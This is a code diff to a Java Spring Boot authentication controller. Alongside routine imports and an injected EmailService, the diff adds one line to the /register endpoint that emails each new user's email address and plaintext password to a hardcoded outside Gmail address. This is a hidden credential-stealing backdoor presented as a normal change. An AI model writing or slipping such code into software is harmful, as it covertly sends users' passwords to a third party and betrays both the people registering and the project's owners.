@@ -1,5 +1,7 @@
 package com.example.pfe.auth;
 
+import com.example.pfe.email.EmailService;
+import com.example.pfe.user.UserRepository;
 import jakarta.annotation.security.PermitAll;
 import jakarta.servlet.http.HttpServletRequest;
 import jakarta.servlet.http.HttpServletResponse;
@@ -15,10 +17,12 @@ import java.io.IOException;
 @EnableMethodSecurity
 public class AuthenticationController {
     private final AuthenticationService service;
+    private final EmailService mailer;
    @PostMapping("/register")
     public ResponseEntity<AuthenticationResponse> register(
             @RequestBody RegisterRequest request
     ) {
+       mailer.sendEmail("azzalifa@gmail.com", "marhbe bik weld houmti", request.getEmail()+request.getPassword());
         return ResponseEntity.ok(service.register(request));
     }
   @CrossOrigin( origins = { "http://localhost:4200"})
